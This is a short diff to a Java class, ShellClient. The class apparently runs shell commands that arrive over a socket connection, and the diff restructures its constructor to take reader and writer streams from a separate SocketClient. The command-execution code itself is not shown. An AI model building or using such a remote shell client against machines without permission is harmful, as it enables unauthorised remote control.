@@ -1,16 +1,18 @@
-package Socket;
+package SocketClient;
 
 import java.io.*;
 
-public class ShellClient extends SocketClient {
+public class ShellClient  {
 
-    private BufferedReader shellReader;
-    private BufferedReader shellErrorReader;
-    private ProcessBuilder processBuilder;
-    private String os;
+    BufferedReader socketReader;
+    BufferedWriter socketWriter;
+    ProcessBuilder processBuilder;
+    String os;
 
-    public ShellClient(String target_IP, int port) {
-        super(target_IP, port);
+    public ShellClient(SocketClient SocketClient) {
+        socketReader = SocketClient.getSocketReader();
+        socketWriter = SocketClient.getSocketWriter();
+
         initShell();
         startExecThread();
     }
